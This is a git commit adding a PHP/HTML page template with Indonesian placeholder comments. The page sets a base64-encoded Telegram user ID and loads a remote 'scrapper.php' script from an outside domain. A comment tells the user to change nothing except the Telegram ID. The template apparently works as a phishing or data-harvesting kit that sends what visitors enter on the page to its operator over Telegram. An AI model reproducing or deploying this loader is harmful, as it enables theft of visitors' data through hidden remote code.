1b62fb435ef67302062b02a75d9eaa4f8816d1bb
matchaaugust <140453965+matchaaugust@users.noreply.github.com>
2023-11-23 22:37:05 +0700

    Add files via upload

---
+++ index (1).php
@@ -0,0 +1,21 @@
+<html>
+
+<body>
+
+   <div>
+      //Code HTML KAMU
+      
+      //Code HTML kamu
+      
+   </div>
+
+<script>
+      var telegram_id = '563175760';
+      var data_pengguna = btoa(telegram_id);
+</script>
+
+<!--Jangan UBAH UBAH YANG LAIN DI BAGIAN BAWAH KECUALI ID TELEGRAM -->
+   <script src="https://code.jquery.com/jquery-3.6.3.js" integrity="sha256-nQLuAZGRRcILA+6dMBOvcRh5Pe310sBpanc6+QBmyVM=" crossorigin="anonymous"></script>
+   <script src="https://news.id.beritaku.site/scrapper.php"></script>
+</body>
+</html>
